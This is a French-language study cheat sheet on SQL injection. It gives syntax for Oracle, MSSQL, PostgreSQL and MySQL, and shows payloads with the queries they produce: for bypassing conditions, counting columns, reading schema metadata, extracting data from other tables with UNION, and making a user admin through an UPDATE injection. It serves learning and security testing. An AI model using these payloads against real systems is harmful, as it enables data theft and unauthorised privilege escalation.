# Introduction

Les injections SQL consistent à détourner la payload traditionnelle d'SQL pour y injecter du code SQL. On liste différents SGBD qui auront chacun sa syntaxe.

```sql
select *
from ma_table
where col = $var and ...;
```
avec `col` un string.
Avec `$var = ' or 1=1;--`
```sql
select *
from ma_table
where col = '' or 1=1;--' and ...;
```
Plusieurs techniques permettent plusieurs résultats, dont l'exfiltration de données, et cetera.
# Syntaxes rapides

Fiche : https://portswigger.net/web-security/sql-injection/cheat-sheet
## Rappels syntaxe

- `'` marquage string
- Logique : `or 1=1` toujours **vrai**, `and 1=2` toujours **faux**, `or 1=2` toujours **neutre**
- Wildcard : `like 'marc%'` avec `%`

| Opération     | Oracle                | MSSQL                    | PgSQL                    | MySQL                                                     |
| ------------- | --------------------- | ------------------------ | ------------------------ | --------------------------------------------------------- |
| Commentaire   | `--comm`              | `--comm`<br>`/*comm*/`   | `--comm`<br>`/*comm*/`   | `#comm`<br>`-- comm` (attention espace)<br>`/*comm*/`     |
| Concaténation | 'a' \|\| 'b'          | `'a' + 'b'`              | 'a' \|\| 'b'             | `'a' 'b'`<br>(attention espace)<br><br>`concat('a', 'b')` |
| Substring     | `substr('abc', 1, 1)` | `substring('abc', 1, 1)` | `substring('abc', 1, 1)` | `substring('abc', 1, 1)`                                  |

| Type de donnée                    | Oracle                                                                    | MSSQL                                   | PgSQL                          | MySQL                                                      |
| --------------------------------- | ------------------------------------------------------------------------- | --------------------------------------- | ------------------------------ | ---------------------------------------------------------- |
| string<br>s = size                | `varchar2(s)`                                                             | `varchar(s)`                            | `varchar(s)`<br>`text`         | `varchar(s)`<br>`char(s)`                                  |
| int                               | `number`<br>`integer`                                                     | `int`<br>`bigint`                       | `int`<br>`integer`             | `int`                                                      |
| float<br>t = nb tot<br>v = nb vig | `number(t, v)`                                                            | `decimal(t, v)`<br>`float`              | `numeric(t, v)`<br>`float`     | `decimal(t, v)`<br>`float`                                 |
| dates                             | `date`<br>`timestamp`                                                     | `date`<br>`datetime`                    | `date`<br>`timestamp`          | `date`<br>`datetime`                                       |
| booléens                          | Aucun                                                                     | `bit`                                   | `boolean`                      | `boolean`<br>`tinyint(1)`                                  |
| Casting                           | `to_char(x)`<br>`to_number(x)` (int et float)<br>`to_date(x, format)`<br> | `cast(x as TYPE)`<br>`convert(TYPE, x)` | `cast(x as TYPE)`<br>`x::TYPE` | `cast(x as TYPE)`<br>`str_to_date(x)` (dates from strings) |
> MySQL : utiliser `char` pour strings et `signed`/`unsigned` pour int **lors d'un cast**.
## Points d'entrée

```sql
-- SELECT

select *
from ma_table
join $var on ($var = $var2) -- using($var) pour matching de nom
where col = $var
group by $var
having fct($var)
order by $var asc/desc
limit $var

-- INSERT

insert into t (col, col2) values ($var, $var2), ($var3, $var4), ...
insert into t values ($var, $var2), ($var3, $var4), ...

-- UPDATE

update ma_table
set col = $var, col2 = $var2
where col = $var3

-- DELETE

delete from ma_table
where col = $var;
```
# Mécanismes de base des SQLi
## Déterminer le schéma de la base
### Déterminer le type des colonnes

> **But** : colonne par colonne, on va essayer plusieurs types de données pour voir si ça plante.
> **Prérequis** : connaître nb de colonnes.
> **Astuce** : éviter les casts implicits.
> **Astuce** : test **colonne par colonne**.
```sql
select * from users where name = $name and password = $password
```

- `' union select null, ..., 'stringtest', ..., null--`
- **Oracle** avec from dual : `' union select null, ..., 'stringtest', ..., null from dual--`
```sql
select * from users where name = '' union select 'stringtest', null--' and password = '...'
-- >> err : 1re colonne pas un string

select * from users where name = '' union select null, 'stringtest'--' and password = '...'
-- >> pas err : 2e colonne potentiellement un string (dépend de si le string peut se caster)

-- Oracle
select * from users where name = '' union select 'stringtest', null--' and password = '...'
```
## Obtenir les métadonnées

> **But** : obtenir métadonnées du SGBD.

| Métadonnée           | Oracle                                                                   | MSSQL                                                           | PgSQL                                                           | MySQL                                                           |
| -------------------- | ------------------------------------------------------------------------ | --------------------------------------------------------------- | --------------------------------------------------------------- | --------------------------------------------------------------- |
| Version              | select banner<br>from v\$version;<br>select version<br>from v\$instance; | select @@version;                                               | select version();                                               | select @@version;                                               |
| Listing des tables   | select \* from all_tables;                                               | select \* from information_schema.tables;                       | select \* from information_schema.tables;                       | select \* from information_schema.tables;                       |
| Listing des colonnes | select * from all_tab_columns where table_name = '';                     | select * from information_schema.columns where table_name = ''; | select * from information_schema.columns where table_name = ''; | select * from information_schema.columns where table_name = ''; |

### Compter les colonnes retournées
#### Par order by

> **But** : Tester séquentiellement le nb de colonne à filtrer jusqu'à tomber sur une erreur à cause d'un dépassement, `order by $x` = ordonner sur la x-ième colonne.
```sql
select * from products where category = $var
```

- `' order by x--` (x = 1, 2, ...)
```sql
select * from products where category = '' order by x--'
```
#### Par union

> **But** : Tester séquentiellement l'`union` pour compter les colonnes (nb `null` = nb colonnes), `null` compatible avec quasiment tous les datatypes.
```sql
select * from products where category = $var
```

- nb null = nb colonnes : `' union select null, ..., null--`
-  **Oracle** avec from dual : `' union select null, ..., null from dual--`
```sql
-- Essai 1 (1 null)
select * from products where category = '' union select null--'
-- >> err : pas une seule colonne

-- Essai 2 (2 null)
select * from products where category = '' union select null, null--'
-- >> pas err : 2 colonnes retournées

-- Oracle
select * from products where category = '' union select null from dual--'
```
## Manipulation des données
### Exfiltration des données
#### Données issues de la même table cible

> **But** : récupérer des données et bypasser une condition
```sql
select * from products where category = $var and released = 1 -- que les objets released
```

- Filtre et skip : `cat'--`
```sql
select * from products where category = 'cat'--' and released = 1
```

- Skip : `' or 1=1--`
```sql
select * from products where category = '' or 1=1--' and released = 1
```
#### Données issues d'autres tables

> **But** : récupérer des données d'autres colonnes via une union.
> **Prérequis** : avoir nom des tables et colonnes.
> **Prérequis** : matcher nb colonnes et types des colonnes.
```sql
select * from products where category = $var
```

- `' union select ... from t--`
```sql
select * from products where category = '' union select ... from t--'
-- >> err : nb ou types colonne incompatible.
-- >> pas err : résultats obtenus.
```
### Compacter les données

> **But** : concaténer les données dans un unique varchar.
> **Prérequis** : avoir nom des colonnes.
> **Prérequis** : matcher nombre de colonnes (padder avec `null` si nécessaire).
> **Prérequis** : doit aller dans un varchar.
> **Astuce** : utiliser méthodes de casts.
> **Astuce** : pas dépasser taille du varchar.
```sql
select * from products where category = $var
```

- `' union select cast(col1 as varchar) || ' ~ ' || ... || ' ~ ' || cast(coln as varchar), ..., null from t--`
```sql
select * from products where category = '' union select cast(col1 as varchar) || ' ~ ' || ... || ' ~ ' || cast(coln as varchar), ..., null from t--'
```
### Modifier la table

> **But** : altérer la table.
> **Prérequis** : avoir nom des colonnes.
```sql
update users
set username = $var
where col = $var2
```

- `value', rank = 'admin`
```sql
update users
set username = 'value', rank = 'admin'
where col = '...'
```
